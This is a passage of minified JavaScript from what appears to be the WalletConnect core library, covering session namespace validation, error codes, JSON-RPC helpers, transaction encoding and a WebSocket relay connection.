}
function sa(q, U, Z) {
    return `${q}?wc_ev=${Z}&topic=${U}`
}
var ia = Object.defineProperty
  , fa = Object.defineProperties
  , ca = Object.getOwnPropertyDescriptors
  , Fo$1 = Object.getOwnPropertySymbols
  , aa = Object.prototype.hasOwnProperty
  , ua = Object.prototype.propertyIsEnumerable
  , zo$1 = (q, U, Z) => U in q ? ia(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , la = (q, U) => {
    for (var Z in U || (U = {}))
        aa.call(U, Z) && zo$1(q, Z, U[Z]);
    if (Fo$1)
        for (var Z of Fo$1(U))
            ua.call(U, Z) && zo$1(q, Z, U[Z]);
    return q
}
  , da = (q, U) => fa(q, ca(U));
function qt$1(q) {
    const U = [];
    return q.forEach(Z => {
        const [oe,et] = Z.split(":");
        U.push(`${oe}:${et}`)
    }
    ),
    U
}
function Go$1(q) {
    const U = [];
    return Object.values(q).forEach(Z => {
        U.push(...qt$1(Z.accounts))
    }
    ),
    U
}
function Zo$1(q, U) {
    const Z = [];
    return Object.values(q).forEach(oe => {
        qt$1(oe.accounts).includes(U) && Z.push(...oe.methods)
    }
    ),
    Z
}
function Wo$1(q, U) {
    const Z = [];
    return Object.values(q).forEach(oe => {
        qt$1(oe.accounts).includes(U) && Z.push(...oe.events)
    }
    ),
    Z
}
function Pn$1(q) {
    return q.includes(":")
}
function Yo$1(q) {
    return Pn$1(q) ? q.split(":")[0] : q
}
function ye$1(q) {
    var U, Z, oe;
    const et = {};
    if (!Ve$1(q))
        return et;
    for (const [st,ws] of Object.entries(q)) {
        const ms = Pn$1(st) ? [st] : ws.chains
          , Es = ws.methods || []
          , vs = ws.events || []
          , _s = Yo$1(st);
        et[_s] = da(la({}, et[_s]), {
            chains: ct(ms, (U = et[_s]) == null ? void 0 : U.chains),
            methods: ct(Es, (Z = et[_s]) == null ? void 0 : Z.methods),
            events: ct(vs, (oe = et[_s]) == null ? void 0 : oe.events)
        })
    }
    return et
}
function Xo$1(q) {
    const U = {};
    return q == null || q.forEach(Z => {
        var oe;
        const [et,st] = Z.split(":");
        U[et] || (U[et] = {
            accounts: [],
            chains: [],
            events: [],
            methods: []
        }),
        U[et].accounts.push(Z),
        (oe = U[et].chains) == null || oe.push(`${et}:${st}`)
    }
    ),
    U
}
function ga(q, U) {
    U = U.map(oe => oe.replace("did:pkh:", ""));
    const Z = Xo$1(U);
    for (const [oe,et] of Object.entries(Z))
        et.methods ? et.methods = ct(et.methods, q) : et.methods = q,
        et.events = ["chainChanged", "accountsChanged"];
    return Z
}
function ba(q, U) {
    var Z, oe, et, st, ws, ms;
    const Es = ye$1(q)
      , vs = ye$1(U)
      , _s = {}
      , Is = Object.keys(Es).concat(Object.keys(vs));
    for (const Ss of Is)
        _s[Ss] = {
            chains: ct((Z = Es[Ss]) == null ? void 0 : Z.chains, (oe = vs[Ss]) == null ? void 0 : oe.chains),
            methods: ct((et = Es[Ss]) == null ? void 0 : et.methods, (st = vs[Ss]) == null ? void 0 : st.methods),
            events: ct((ws = Es[Ss]) == null ? void 0 : ws.events, (ms = vs[Ss]) == null ? void 0 : ms.events)
        };
    return _s
}
const Jo$1 = {
    INVALID_METHOD: {
        message: "Invalid method.",
        code: 1001
    },
    INVALID_EVENT: {
        message: "Invalid event.",
        code: 1002
    },
    INVALID_UPDATE_REQUEST: {
        message: "Invalid update request.",
        code: 1003
    },
    INVALID_EXTEND_REQUEST: {
        message: "Invalid extend request.",
        code: 1004
    },
    INVALID_SESSION_SETTLE_REQUEST: {
        message: "Invalid session settle request.",
        code: 1005
    },
    UNAUTHORIZED_METHOD: {
        message: "Unauthorized method.",
        code: 3001
    },
    UNAUTHORIZED_EVENT: {
        message: "Unauthorized event.",
        code: 3002
    },
    UNAUTHORIZED_UPDATE_REQUEST: {
        message: "Unauthorized update request.",
        code: 3003
    },
    UNAUTHORIZED_EXTEND_REQUEST: {
        message: "Unauthorized extend request.",
        code: 3004
    },
    USER_REJECTED: {
        message: "User rejected.",
        code: 5e3
    },
    USER_REJECTED_CHAINS: {
        message: "User rejected chains.",
        code: 5001
    },
    USER_REJECTED_METHODS: {
        message: "User rejected methods.",
        code: 5002
    },
    USER_REJECTED_EVENTS: {
        message: "User rejected events.",
        code: 5003
    },
    UNSUPPORTED_CHAINS: {
        message: "Unsupported chains.",
        code: 5100
    },
    UNSUPPORTED_METHODS: {
        message: "Unsupported methods.",
        code: 5101
    },
    UNSUPPORTED_EVENTS: {
        message: "Unsupported events.",
        code: 5102
    },
    UNSUPPORTED_ACCOUNTS: {
        message: "Unsupported accounts.",
        code: 5103
    },
    UNSUPPORTED_NAMESPACE_KEY: {
        message: "Unsupported namespace key.",
        code: 5104
    },
    USER_DISCONNECTED: {
        message: "User disconnected.",
        code: 6e3
    },
    SESSION_SETTLEMENT_FAILED: {
        message: "Session settlement failed.",
        code: 7e3
    },
    WC_METHOD_UNSUPPORTED: {
        message: "Unsupported wc_ method.",
        code: 10001
    }
}
  , Qo = {
    NOT_INITIALIZED: {
        message: "Not initialized.",
        code: 1
    },
    NO_MATCHING_KEY: {
        message: "No matching key.",
        code: 2
    },
    RESTORE_WILL_OVERRIDE: {
        message: "Restore will override.",
        code: 3
    },
    RESUBSCRIBED: {
        message: "Resubscribed.",
        code: 4
    },
    MISSING_OR_INVALID: {
        message: "Missing or invalid.",
        code: 5
    },
    EXPIRED: {
        message: "Expired.",
        code: 6
    },
    UNKNOWN_TYPE: {
        message: "Unknown type.",
        code: 7
    },
    MISMATCHED_TOPIC: {
        message: "Mismatched topic.",
        code: 8
    },
    NON_CONFORMING_NAMESPACES: {
        message: "Non conforming namespaces.",
        code: 9
    }
};
function Et$2(q, U) {
    const {message: Z, code: oe} = Qo[q];
    return {
        message: U ? `${Z} ${U}` : Z,
        code: oe
    }
}
function Kt$1(q, U) {
    const {message: Z, code: oe} = Jo$1[q];
    return {
        message: U ? `${Z} ${U}` : Z,
        code: oe
    }
}
function me$1(q, U) {
    return Array.isArray(q) ? typeof U < "u" && q.length ? q.every(U) : !0 : !1
}
function Ve$1(q) {
    return Object.getPrototypeOf(q) === Object.prototype && Object.keys(q).length
}
function kt$1(q) {
    return typeof q > "u"
}
function it(q, U) {
    return U && kt$1(q) ? !0 : typeof q == "string" && !!q.trim().length
}
function qe$1(q, U) {
    return U && kt$1(q) ? !0 : typeof q == "number" && !isNaN(q)
}
function ya(q, U) {
    const {requiredNamespaces: Z} = U
      , oe = Object.keys(q.namespaces)
      , et = Object.keys(Z);
    let st = !0;
    return It$1(et, oe) ? (oe.forEach(ws => {
        const {accounts: ms, methods: Es, events: vs} = q.namespaces[ws]
          , _s = qt$1(ms)
          , Is = Z[ws];
        (!It$1(ve(ws, Is), _s) || !It$1(Is.methods, Es) || !It$1(Is.events, vs)) && (st = !1)
    }
    ),
    st) : !1
}
function we$1(q) {
    return it(q, !1) && q.includes(":") ? q.split(":").length === 2 : !1
}
function ts(q) {
    if (it(q, !1) && q.includes(":")) {
        const U = q.split(":");
        if (U.length === 3) {
            const Z = U[0] + ":" + U[1];
            return !!U[2] && we$1(Z)
        }
    }
    return !1
}
function ma(q) {
    function U(Z) {
        try {
            return typeof new URL(Z) < "u"
        } catch {
            return !1
        }
    }
    try {
        if (it(q, !1)) {
            if (U(q))
                return !0;
            const Z = Qe$1(q);
            return U(Z)
        }
    } catch {}
    return !1
}
function wa(q) {
    var U;
    return (U = q == null ? void 0 : q.proposer) == null ? void 0 : U.publicKey
}
function xa(q) {
    return q == null ? void 0 : q.topic
}
function va(q, U) {
    let Z = null;
    return it(q == null ? void 0 : q.publicKey, !1) || (Z = Et$2("MISSING_OR_INVALID", `${U} controller public key should be a string`)),
    Z
}
function Hn$1(q) {
    let U = !0;
    return me$1(q) ? q.length && (U = q.every(Z => it(Z, !1))) : U = !1,
    U
}
function es(q, U, Z) {
    let oe = null;
    return me$1(U) && U.length ? U.forEach(et => {
        oe || we$1(et) || (oe = Kt$1("UNSUPPORTED_CHAINS", `${Z}, chain ${et} should be a string and conform to "namespace:chainId" format`))
    }
    ) : we$1(q) || (oe = Kt$1("UNSUPPORTED_CHAINS", `${Z}, chains must be defined as "namespace:chainId" e.g. "eip155:1": {...} in the namespace key OR as an array of CAIP-2 chainIds e.g. eip155: { chains: ["eip155:1", "eip155:5"] }`)),
    oe
}
function ns(q, U, Z) {
    let oe = null;
    return Object.entries(q).forEach( ([et,st]) => {
        if (oe)
            return;
        const ws = es(et, ve(et, st), `${U} ${Z}`);
        ws && (oe = ws)
    }
    ),
    oe
}
function rs(q, U) {
    let Z = null;
    return me$1(q) ? q.forEach(oe => {
        Z || ts(oe) || (Z = Kt$1("UNSUPPORTED_ACCOUNTS", `${U}, account ${oe} should be a string and conform to "namespace:chainId:address" format`))
    }
    ) : Z = Kt$1("UNSUPPORTED_ACCOUNTS", `${U}, accounts should be an array of strings conforming to "namespace:chainId:address" format`),
    Z
}
function os(q, U) {
    let Z = null;
    return Object.values(q).forEach(oe => {
        if (Z)
            return;
        const et = rs(oe == null ? void 0 : oe.accounts, `${U} namespace`);
        et && (Z = et)
    }
    ),
    Z
}
function ss(q, U) {
    let Z = null;
    return Hn$1(q == null ? void 0 : q.methods) ? Hn$1(q == null ? void 0 : q.events) || (Z = Kt$1("UNSUPPORTED_EVENTS", `${U}, events should be an array of strings or empty array for no events`)) : Z = Kt$1("UNSUPPORTED_METHODS", `${U}, methods should be an array of strings or empty array for no methods`),
    Z
}
function Dn$1(q, U) {
    let Z = null;
    return Object.values(q).forEach(oe => {
        if (Z)
            return;
        const et = ss(oe, `${U}, namespace`);
        et && (Z = et)
    }
    ),
    Z
}
function Ea(q, U, Z) {
    let oe = null;
    if (q && Ve$1(q)) {
        const et = Dn$1(q, U);
        et && (oe = et);
        const st = ns(q, U, Z);
        st && (oe = st)
    } else
        oe = Et$2("MISSING_OR_INVALID", `${U}, ${Z} should be an object with data`);
    return oe
}
function is(q, U) {
    let Z = null;
    if (q && Ve$1(q)) {
        const oe = Dn$1(q, U);
        oe && (Z = oe);
        const et = os(q, U);
        et && (Z = et)
    } else
        Z = Et$2("MISSING_OR_INVALID", `${U}, namespaces should be an object with data`);
    return Z
}
function fs(q) {
    return it(q.protocol, !0)
}
function Ba(q, U) {
    let Z = !1;
    return U && !q ? Z = !0 : q && me$1(q) && q.length && q.forEach(oe => {
        Z = fs(oe)
    }
    ),
    Z
}
function Ia(q) {
    return typeof q == "number"
}
function Aa(q) {
    return typeof q < "u" && typeof q !== null
}
function Sa(q) {
    return !(!q || typeof q != "object" || !q.code || !qe$1(q.code, !1) || !q.message || !it(q.message, !1))
}
function Na(q) {
    return !(kt$1(q) || !it(q.method, !1))
}
function Oa(q) {
    return !(kt$1(q) || kt$1(q.result) && kt$1(q.error) || !qe$1(q.id, !1) || !it(q.jsonrpc, !1))
}
function Ua(q) {
    return !(kt$1(q) || !it(q.name, !1))
}
function _a(q, U) {
    return !(!we$1(U) || !Go$1(q).includes(U))
}
function Ta(q, U, Z) {
    return it(Z, !1) ? Zo$1(q, U).includes(Z) : !1
}
function Ra(q, U, Z) {
    return it(Z, !1) ? Wo$1(q, U).includes(Z) : !1
}
function cs(q, U, Z) {
    let oe = null;
    const et = $a(q)
      , st = Ca(U)
      , ws = Object.keys(et)
      , ms = Object.keys(st)
      , Es = as(Object.keys(q))
      , vs = as(Object.keys(U))
      , _s = Es.filter(Is => !vs.includes(Is));
    return _s.length && (oe = Et$2("NON_CONFORMING_NAMESPACES", `${Z} namespaces keys don't satisfy requiredNamespaces.
      Required: ${_s.toString()}
      Received: ${Object.keys(U).toString()}`)),
    It$1(ws, ms) || (oe = Et$2("NON_CONFORMING_NAMESPACES", `${Z} namespaces chains don't satisfy required namespaces.
      Required: ${ws.toString()}
      Approved: ${ms.toString()}`)),
    Object.keys(U).forEach(Is => {
        if (!Is.includes(":") || oe)
            return;
        const Ss = qt$1(U[Is].accounts);
        Ss.includes(Is) || (oe = Et$2("NON_CONFORMING_NAMESPACES", `${Z} namespaces accounts don't satisfy namespace accounts for ${Is}
        Required: ${Is}
        Approved: ${Ss.toString()}`))
    }
    ),
    ws.forEach(Is => {
        oe || (It$1(et[Is].methods, st[Is].methods) ? It$1(et[Is].events, st[Is].events) || (oe = Et$2("NON_CONFORMING_NAMESPACES", `${Z} namespaces events don't satisfy namespace events for ${Is}`)) : oe = Et$2("NON_CONFORMING_NAMESPACES", `${Z} namespaces methods don't satisfy namespace methods for ${Is}`))
    }
    ),
    oe
}
function $a(q) {
    const U = {};
    return Object.keys(q).forEach(Z => {
        var oe;
        Z.includes(":") ? U[Z] = q[Z] : (oe = q[Z].chains) == null || oe.forEach(et => {
            U[et] = {
                methods: q[Z].methods,
                events: q[Z].events
            }
        }
        )
    }
    ),
    U
}
function as(q) {
    return [...new Set(q.map(U => U.includes(":") ? U.split(":")[0] : U))]
}
function Ca(q) {
    const U = {};
    return Object.keys(q).forEach(Z => {
        if (Z.includes(":"))
            U[Z] = q[Z];
        else {
            const oe = qt$1(q[Z].accounts);
            oe == null || oe.forEach(et => {
                U[et] = {
                    accounts: q[Z].accounts.filter(st => st.includes(`${et}:`)),
                    methods: q[Z].methods,
                    events: q[Z].events
                }
            }
            )
        }
    }
    ),
    U
}
function La(q, U) {
    return qe$1(q, !1) && q <= U.max && q >= U.min
}
function ja() {
    const q = Pt$1();
    return new Promise(U => {
        switch (q) {
        case J.browser:
            U(us());
            break;
        case J.reactNative:
            U(ls());
            break;
        case J.node:
            U(ds());
            break;
        default:
            U(!0)
        }
    }
    )
}
function us() {
    return zt$1() && (navigator == null ? void 0 : navigator.onLine)
}
async function ls() {
    if (Bt$1() && typeof window < "u" && window != null && window.NetInfo) {
        const q = await (window == null ? void 0 : window.NetInfo.fetch());
        return q == null ? void 0 : q.isConnected
    }
    return !0
}
function ds() {
    return !0
}
function ka(q) {
    switch (Pt$1()) {
    case J.browser:
        hs(q);
        break;
    case J.reactNative:
        ps(q);
        break
    }
}
function hs(q) {
    !Bt$1() && zt$1() && (window.addEventListener("online", () => q(!0)),
    window.addEventListener("offline", () => q(!1)))
}
function ps(q) {
    Bt$1() && typeof window < "u" && window != null && window.NetInfo && (window == null || window.NetInfo.addEventListener(U => q(U == null ? void 0 : U.isConnected)))
}
function Pa() {
    var q;
    return zt$1() && getDocument_1() ? ((q = getDocument_1()) == null ? void 0 : q.visibilityState) === "visible" : !0
}
const Mn$1 = {};
class Ha {
    static get(U) {
        return Mn$1[U]
    }
    static set(U, Z) {
        Mn$1[U] = Z
    }
    static delete(U) {
        delete Mn$1[U]
    }
}
function gs(q) {
    const U = re$1.decode(q);
    if (U.length < 33)
        throw new Error("Too short to contain a public key");
    return U.slice(1, 33)
}
function bs$1({publicKey: q, signature: U, payload: Z}) {
    var oe;
    const et = Vn$1(Z.method)
      , st = 128 | parseInt(((oe = Z.version) == null ? void 0 : oe.toString()) || "4")
      , ws = Ma(Z.address)
      , ms = Z.era === "00" ? new Uint8Array([0]) : Vn$1(Z.era);
    if (ms.length !== 1 && ms.length !== 2)
        throw new Error("Invalid era length");
    const Es = parseInt(Z.nonce, 16)
      , vs = new Uint8Array([Es & 255, Es >> 8 & 255])
      , _s = BigInt(`0x${Da(Z.tip)}`)
      , Is = qa(_s)
      , Ss = new Uint8Array([0, ...q, ws, ...U, ...ms, ...vs, ...Is, ...et])
      , Ts = Va(Ss.length + 1);
    return new Uint8Array([...Ts, st, ...Ss])
}
function ys(q) {
    const U = Vn$1(q)
      , Z = blakejs.blake2b(U, void 0, 32);
    return "0x" + Buffer.from(Z).toString("hex")
}
function Vn$1(q) {
    return new Uint8Array(q.replace(/^0x/, "").match(/.{1,2}/g).map(U => parseInt(U, 16)))
}
function Da(q) {
    return q.startsWith("0x") ? q.slice(2) : q
}
function Ma(q) {
    const U = re$1.decode(q)[0];
    return U === 42 ? 0 : U === 60 ? 2 : 1
}
function Va(q) {
    if (q < 64)
        return new Uint8Array([q << 2]);
    if (q < 16384) {
        const U = q << 2 | 1;
        return new Uint8Array([U & 255, U >> 8 & 255])
    } else if (q < 1 << 30) {
        const U = q << 2 | 2;
        return new Uint8Array([U & 255, U >> 8 & 255, U >> 16 & 255, U >> 24 & 255])
    } else
        throw new Error("Compact encoding > 2^30 not supported")
}
function qa(q) {
    if (q < BigInt(1) << BigInt(6))
        return new Uint8Array([Number(q << BigInt(2))]);
    if (q < BigInt(1) << BigInt(14)) {
        const U = q << BigInt(2) | BigInt(1);
        return new Uint8Array([Number(U & BigInt(255)), Number(U >> BigInt(8) & BigInt(255))])
    } else if (q < BigInt(1) << BigInt(30)) {
        const U = q << BigInt(2) | BigInt(2);
        return new Uint8Array([Number(U & BigInt(255)), Number(U >> BigInt(8) & BigInt(255)), Number(U >> BigInt(16) & BigInt(255)), Number(U >> BigInt(24) & BigInt(255))])
    } else
        throw new Error("BigInt compact encoding not supported > 2^30")
}
function Ka(q) {
    const U = Uint8Array.from(Buffer.from(q.signature, "hex"))
      , Z = gs(q.transaction.address)
      , oe = bs$1({
        publicKey: Z,
        signature: U,
        payload: q.transaction
    })
      , et = Buffer.from(oe).toString("hex");
    return ys(et)
}
const PARSE_ERROR = "PARSE_ERROR"
  , INVALID_REQUEST = "INVALID_REQUEST"
  , METHOD_NOT_FOUND = "METHOD_NOT_FOUND"
  , INVALID_PARAMS = "INVALID_PARAMS"
  , INTERNAL_ERROR = "INTERNAL_ERROR"
  , SERVER_ERROR = "SERVER_ERROR"
  , RESERVED_ERROR_CODES = [-32700, -32600, -32601, -32602, -32603]
  , STANDARD_ERROR_MAP = {
    [PARSE_ERROR]: {
        code: -32700,
        message: "Parse error"
    },
    [INVALID_REQUEST]: {
        code: -32600,
        message: "Invalid Request"
    },
    [METHOD_NOT_FOUND]: {
        code: -32601,
        message: "Method not found"
    },
    [INVALID_PARAMS]: {
        code: -32602,
        message: "Invalid params"
    },
    [INTERNAL_ERROR]: {
        code: -32603,
        message: "Internal error"
    },
    [SERVER_ERROR]: {
        code: -32e3,
        message: "Server error"
    }
}
  , DEFAULT_ERROR = SERVER_ERROR;
function isReservedErrorCode(q) {
    return RESERVED_ERROR_CODES.includes(q)
}
function getError(q) {
    return Object.keys(STANDARD_ERROR_MAP).includes(q) ? STANDARD_ERROR_MAP[q] : STANDARD_ERROR_MAP[DEFAULT_ERROR]
}
function getErrorByCode(q) {
    const U = Object.values(STANDARD_ERROR_MAP).find(Z => Z.code === q);
    return U || STANDARD_ERROR_MAP[DEFAULT_ERROR]
}
function parseConnectionError(q, U, Z) {
    return q.message.includes("getaddrinfo ENOTFOUND") || q.message.includes("connect ECONNREFUSED") ? new Error(`Unavailable ${Z} RPC url at ${U}`) : q
}
var cjs = {}, crypto$1 = {}, hasRequiredCrypto;
function requireCrypto() {
    if (hasRequiredCrypto)
        return crypto$1;
    hasRequiredCrypto = 1,
    Object.defineProperty(crypto$1, "__esModule", {
        value: !0
    }),
    crypto$1.isBrowserCryptoAvailable = crypto$1.getSubtleCrypto = crypto$1.getBrowerCrypto = void 0;
    function q() {
        return (window == null ? void 0 : window.crypto) || (window == null ? void 0 : window.msCrypto) || {}
    }
    crypto$1.getBrowerCrypto = q;
    function U() {
        const oe = q();
        return oe.subtle || oe.webkitSubtle
    }
    crypto$1.getSubtleCrypto = U;
    function Z() {
        return !!q() && !!U()
    }
    return crypto$1.isBrowserCryptoAvailable = Z,
    crypto$1
}
var env = {}, hasRequiredEnv;
function requireEnv() {
    if (hasRequiredEnv)
        return env;
    hasRequiredEnv = 1,
    Object.defineProperty(env, "__esModule", {
        value: !0
    }),
    env.isBrowser = env.isNode = env.isReactNative = void 0;
    function q() {
        return typeof document > "u" && typeof navigator < "u" && navigator.product === "ReactNative"
    }
    env.isReactNative = q;
    function U() {
        return typeof process < "u" && typeof process.versions < "u" && typeof process.versions.node < "u"
    }
    env.isNode = U;
    function Z() {
        return !q() && !U()
    }
    return env.isBrowser = Z,
    env
}
(function(q) {
    Object.defineProperty(q, "__esModule", {
        value: !0
    });
    const U = require$$0;
    U.__exportStar(requireCrypto(), q),
    U.__exportStar(requireEnv(), q)
}
)(cjs);
function payloadId(q=3) {
    const U = Date.now() * Math.pow(10, q)
      , Z = Math.floor(Math.random() * Math.pow(10, q));
    return U + Z
}
function getBigIntRpcId(q=6) {
    return BigInt(payloadId(q))
}
function formatJsonRpcRequest(q, U, Z) {
    return {
        id: Z || payloadId(),
        jsonrpc: "2.0",
        method: q,
        params: U
    }
}
function formatJsonRpcResult(q, U) {
    return {
        id: q,
        jsonrpc: "2.0",
        result: U
    }
}
function formatJsonRpcError(q, U, Z) {
    return {
        id: q,
        jsonrpc: "2.0",
        error: formatErrorMessage(U, Z)
    }
}
function formatErrorMessage(q, U) {
    return typeof q > "u" ? getError(INTERNAL_ERROR) : (typeof q == "string" && (q = Object.assign(Object.assign({}, getError(SERVER_ERROR)), {
        message: q
    })),
    typeof U < "u" && (q.data = U),
    isReservedErrorCode(q.code) && (q = getErrorByCode(q.code)),
    q)
}
class e {
}
class n extends e {
    constructor() {
        super()
    }
}
class r extends n {
    constructor(U) {
        super()
    }
}
const WS_REGEX = "^wss?:";
function getUrlProtocol(q) {
    const U = q.match(new RegExp(/^\w+:/,"gi"));
    if (!(!U || !U.length))
        return U[0]
}
function matchRegexProtocol(q, U) {
    const Z = getUrlProtocol(q);
    return typeof Z > "u" ? !1 : new RegExp(U).test(Z)
}
function isWsUrl(q) {
    return matchRegexProtocol(q, WS_REGEX)
}
function isLocalhostUrl(q) {
    return new RegExp("wss?://localhost(:d{2,5})?").test(q)
}
function isJsonRpcPayload(q) {
    return typeof q == "object" && "id"in q && "jsonrpc"in q && q.jsonrpc === "2.0"
}
function isJsonRpcRequest(q) {
    return isJsonRpcPayload(q) && "method"in q
}
function isJsonRpcResponse(q) {
    return isJsonRpcPayload(q) && (isJsonRpcResult(q) || isJsonRpcError(q))
}
function isJsonRpcResult(q) {
    return "result"in q
}
function isJsonRpcError(q) {
    return "error"in q
}
class o extends r {
    constructor(U) {
        super(U),
        this.events = new eventsExports.EventEmitter,
        this.hasRegisteredEventListeners = !1,
        this.connection = this.setConnection(U),
        this.connection.connected && this.registerEventListeners()
    }
    async connect(U=this.connection) {
        await this.open(U)
    }
    async disconnect() {
        await this.close()
    }
    on(U, Z) {
        this.events.on(U, Z)
    }
    once(U, Z) {
        this.events.once(U, Z)
    }
    off(U, Z) {
        this.events.off(U, Z)
    }
    removeListener(U, Z) {
        this.events.removeListener(U, Z)
    }
    async request(U, Z) {
        return this.requestStrict(formatJsonRpcRequest(U.method, U.params || [], U.id || getBigIntRpcId().toString()), Z)
    }
    async requestStrict(U, Z) {
        return new Promise(async (oe, et) => {
            if (!this.connection.connected)
                try {
                    await this.open()
                } catch (st) {
                    et(st)
                }
            this.events.on(`${U.id}`, st => {
                isJsonRpcError(st) ? et(st.error) : oe(st.result)
            }
            );
            try {
                await this.connection.send(U, Z)
            } catch (st) {
                et(st)
            }
        }
        )
    }
    setConnection(U=this.connection) {
        return U
    }
    onPayload(U) {
        this.events.emit("payload", U),
        isJsonRpcResponse(U) ? this.events.emit(`${U.id}`, U) : this.events.emit("message", {
            type: U.method,
            data: U.params
        })
    }
    onClose(U) {
        U && U.code === 3e3 && this.events.emit("error", new Error(`WebSocket connection closed abnormally with code: ${U.code} ${U.reason ? `(${U.reason})` : ""}`)),
        this.events.emit("disconnect")
    }
    async open(U=this.connection) {
        this.connection === U && this.connection.connected || (this.connection.connected && this.close(),
        typeof U == "string" && (await this.connection.open(U),
        U = this.connection),
        this.connection = this.setConnection(U),
        await this.connection.open(),
        this.registerEventListeners(),
        this.events.emit("connect"))
    }
    async close() {
        await this.connection.close()
    }
    registerEventListeners() {
        this.hasRegisteredEventListeners || (this.connection.on("payload", U => this.onPayload(U)),
        this.connection.on("close", U => this.onClose(U)),
        this.connection.on("error", U => this.events.emit("error", U)),
        this.connection.on("register_error", U => this.onClose()),
        this.hasRegisteredEventListeners = !0)
    }
}
const v$1 = () => typeof WebSocket < "u" ? WebSocket : typeof window < "u" && typeof window.WebSocket < "u" || typeof window < "u" && typeof window.WebSocket < "u" ? window.WebSocket : typeof self < "u" && typeof self.WebSocket < "u" ? self.WebSocket : require("ws")
  , w$1 = () => typeof WebSocket < "u" || typeof window < "u" && typeof window.WebSocket < "u" || typeof window < "u" && typeof window.WebSocket < "u" || typeof self < "u" && typeof self.WebSocket < "u"
  , d = q => q.split("?")[0]
  , h = 10
  , b = v$1();
let f$2 = class {
    constructor(U) {
        if (this.url = U,
        this.events = new eventsExports.EventEmitter,
        this.registering = !1,
        !isWsUrl(U))
            throw new Error(`Provided URL is not compatible with WebSocket connection: ${U}`);
        this.url = U
    }
    get connected() {
        return typeof this.socket < "u"
    }
    get connecting() {
        return this.registering
    }
    on(U, Z) {
        this.events.on(U, Z)
    }
    once(U, Z) {
        this.events.once(U, Z)
    }
    off(U, Z) {
        this.events.off(U, Z)
    }
    removeListener(U, Z) {
        this.events.removeListener(U, Z)
    }
    async open(U=this.url) {
        await this.register(U)
    }
    async close() {
        return new Promise( (U, Z) => {
            if (typeof this.socket > "u") {
                Z(new Error("Connection already closed"));
                return
            }
            this.socket.onclose = oe => {
                this.onClose(oe),
                U()
            }
            ,
            this.socket.close()
        }
        )
    }
    async send(U) {
        typeof this.socket > "u" && (this.socket = await this.register());
        try {
            this.socket.send(safeJsonStringify(U))
        } catch (Z) {
            this.onError(U.id, Z)
        }
    }
    register(U=this.url) {
        if (!isWsUrl(U))
            throw new Error(`Provided URL is not compatible with WebSocket connection: ${U}`);
        if (this.registering) {
            const Z = this.events.getMaxListeners();
            return (this.events.listenerCount("register_error") >= Z || this.events.listenerCount("open") >= Z) && this.events.setMaxListeners(Z + 1),
            new Promise( (oe, et) => {
                this.events.once("register_error", st => {
                    this.resetMaxListeners(),
                    et(st)
                }
                ),
                this.events.once("open", () => {
                    if (this.resetMaxListeners(),
                    typeof this.socket > "u")
                        return et(new Error("WebSocket connection is missing or invalid"));
                    oe(this.socket)
                }
                )
            }
            )
        }
        return this.url = U,
        this.registering = !0,
        new Promise( (Z, oe) => {
            const et = cjs.isReactNative() ? void 0 : {
                rejectUnauthorized: !isLocalhostUrl(U)
            }
              , st = new b(U,[],et);
            w$1() ? st.onerror = ws => {
                const ms = ws;
                oe(this.emitError(ms.error))
            }
            : st.on("error", ws => {
                oe(this.emitError(ws))
            }
            ),
            st.onopen = () => {
                this.onOpen(st),
                Z(st)
            }
        }
        )
    }
    onOpen(U) {
        U.onmessage = Z => this.onPayload(Z),
        U.onclose = Z => this.onClose(Z),
        this.socket = U,
        this.registering = !1,
        this.events.emit("open")
    }
    onClose(U) {
        this.socket = void 0,
        this.registering = !1,
        this.events.emit("close", U)
    }
    onPayload(U) {
        if (typeof U.data > "u")
            return;
        const Z = typeof U.data == "string" ? safeJsonParse(U.data) : U.data;
        this.events.emit("payload", Z)
    }
    onError(U, Z) {
        const oe = this.parseError(Z)
          , et = oe.message || oe.toString()
          , st = formatJsonRpcError(U, et);
        this.events.emit("payload", st)
    }
    parseError(U, Z=this.url) {
        return parseConnectionError(U, d(Z), "WS")
    }
    resetMaxListeners() {
        this.events.getMaxListeners() > h && this.events.setMaxListeners(h)
    }
    emitError(U) {
        const Z = this.parseError(new Error((U == null ? void 0 : U.message) || `WebSocket connection failed for host: ${d(this.url)}`));
        return this.events.emit("register_error", Z),
        Z
    }
}
;
const ze = "wc"
  , Le$1 = 2
  , he = "core"
  , B = `${ze}@2:${he}:`
  , Et$1 = {
    name: he,
    logger: "error"
}
  , It = {
    database: ":memory:"
}
  , Tt = "crypto"
  , ke$1 = "client_ed25519_seed"
  , Ct = cjs$3.ONE_DAY
  , Pt = "keychain"
  , St$1 = "0.3"
  , Ot = "messages"
  , Rt$1 = "0.3"
  , je = cjs$3.SIX_HOURS
  , At = "publisher"
  , xt = "irn"
  , Nt = "error"
  , Ue = "wss://relay.walletconnect.org"
  , $t = "relayer"
  , C = {
    message: "relayer_message",
    message_ack: "relayer_message_ack",
    connect: "relayer_connect",
    disconnect: "relayer_disconnect",
    error: "relayer_error",
    connection_stalled: "relayer_connection_stalled",
    transport_closed: "relayer_transport_closed",
    publish: "relayer_publish"
}
  , zt = "_subscription"
  , L = {
    payload: "payload",
    connect: "connect",
    disconnect: "disconnect",
    error: "error"
}
  , Lt = .1
  , _e$1 = "2.21.4"
  , Q = {
    link_mode: "link_mode",
    relay: "relay"
}
  , le = {
    inbound: "inbound",
    outbound: "outbound"
}
  , kt = "0.3"
  , jt = "WALLETCONNECT_CLIENT_ID"
  , Fe = "WALLETCONNECT_LINK_MODE_APPS"
  , $$1 = {
    created: "subscription_created",
    deleted: "subscription_deleted",
    expired: "subscription_expired",
    disabled: "subscription_disabled",
    sync: "subscription_sync",
    resubscribed: "subscription_resubscribed"
}
  , Ut = "subscription"
  , Ft = "0.3"
  , Mt = "pairing"
  , Kt = "0.3"
  , se = {
    wc_pairingDelete: {
        req: {
            ttl: cjs$3.ONE_DAY,
            prompt: !1,
            tag: 1e3
        },
        res: {
            ttl: cjs$3.ONE_DAY,
            prompt: !1,
            tag: 1001
        }
    },
    wc_pairingPing: {
        req: {
            ttl: cjs$3.THIRTY_SECONDS,
            prompt: !1,
            tag: 1002
        },
        res: {
            ttl: cjs$3.THIRTY_SECONDS,
            prompt: !1,
            tag: 1003
        }
    },
    unregistered_method: {
        req: {
            ttl: cjs$3.ONE_DAY,
            prompt: !1,
            tag: 0
        },
        res: {
            ttl: cjs$3.ONE_DAY,
            prompt: !1,
            tag: 0
        }
    }
}
  , re = {
    create: "pairing_create",
    expire: "pairing_expire",
    delete: "pairing_delete",
    ping: "pairing_ping"
}
  , F = {
